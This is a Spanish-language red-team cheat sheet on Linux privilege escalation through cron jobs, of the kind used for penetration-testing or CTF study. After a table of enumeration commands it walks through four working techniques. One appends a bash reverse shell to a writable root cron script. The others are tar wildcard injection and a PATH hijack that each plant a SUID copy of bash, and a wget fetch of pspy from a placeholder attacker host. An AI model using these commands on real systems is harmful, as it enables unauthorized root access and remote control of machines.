---
aliases:
  - "Abusing Cron Job"
  - "Cron"
  - "Cron Jobs"
  - Cron
  - Crontab
  - Cron Jobs
tags:
  - type/cheatsheet
  - env/linux
  - technique/privilege-escalation
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Privilege Escalation]]"
kind: CheatSheet
linked:
  - "[[Linux Privilege Escalation]]"
---
# Linux PrivEsc - Cron Jobs

***

## Cheatsheet

| **Técnica**                             | **Comando**                                                                             | **Uso**                                                                              |
| --------------------------------------- | --------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| **Listar cron global**                  | `cat /etc/crontab`                                                                      | Tareas a nivel sistema, suelen correr como root.                                     |
| **Cron dirs sistema**                   | `ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/`              | Scripts ejecutados periódicamente. Revisar permisos de escritura.                    |
| **Cron por usuario**                    | `ls -la /var/spool/cron/crontabs/ 2>/dev/null`                                          | Crontabs privados (requiere permisos).                                               |
| **Monitor cron sin privilegios**        | `./pspy64`                                                                              | Detecta procesos de otros usuarios sin leer /proc/*/status.                          |
| **Buscar scripts escribibles**          | `find / -type f -perm -o+w -path '*/cron*' 2>/dev/null`                                 | Scripts cron modificables por cualquier usuario → sobrescribir.                      |
| **Scripts con path relativo**           | `grep -r '^[^/#]' /etc/cron.d/ 2>/dev/null \| grep -vE '^\s*#'`                         | Si cron ejecuta comando sin path absoluto → PATH hijack.                             |
| **Wildcard injection**                  | Archivos con nombres tipo `--checkpoint=1 --checkpoint-action=exec=sh shell.sh`          | Aprovechar globbing de `tar *`, `chown *`, `rsync *`.                                |
| **Cron escribible directo**             | Detectado con `find` anterior → editar script                                           | Añadir `bash -c "chmod +s /bin/bash"` o reverse shell al final.                      |

^linux-privesc-cron

## Explotación típica

### 1. Script cron escribible

```bash
# Enumeración
cat /etc/crontab
ls -la /etc/cron.d/
# Digamos que /etc/cron.d/backup ejecuta /opt/backup.sh cada minuto como root
# y /opt/backup.sh es escribible
echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' >> /opt/backup.sh
# Esperar al siguiente tick
```

### 2. Wildcard injection con `tar`

```bash
# Cron ejecuta: cd /home/user && tar czf /backup/data.tar.gz *
cd /home/user
echo '' > "--checkpoint=1"
echo '' > "--checkpoint-action=exec=sh shell.sh"
cat > shell.sh << 'SH'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
SH
chmod +x shell.sh
# Esperar ejecución → /tmp/rootbash -p → root
```

### 3. PATH hijack en script cron

```bash
# Cron ejecuta script que hace `tar czf ...` sin path completo
# Y $PATH en el cron incluye /home/user/bin antes de /usr/bin
mkdir -p /home/user/bin
cat > /home/user/bin/tar << 'SH'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
SH
chmod +x /home/user/bin/tar
```

### 4. Detección con pspy

```bash
# Subir pspy64 al target (GitHub: DominicBreuker/pspy)
wget http://ATACANTE/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 1000
# Observar ejecuciones cada N segundos, detectar paths/comandos
```

## Notas clave

- **Variables de entorno de cron**: `/etc/crontab` suele tener `PATH=/usr/bin:/bin` limitado. Si el script asume otro PATH, puede crashear — útil saber al inyectar.
- **Tick mínimo de cron es 1 minuto**. Si `pspy` detecta jobs más frecuentes, suele ser systemd timer o daemon custom.
- **Anacron** (`/etc/anacrontab`) corre tareas perdidas al bootear — vector menos revisado.
- **Systemd timers** (`systemctl list-timers`) son alternativa moderna a cron — mismos principios de abuso sobre unit files escribibles.
- `pspy` no requiere root ni privilegios especiales — funciona vía `inotify` sobre `/proc`.

***
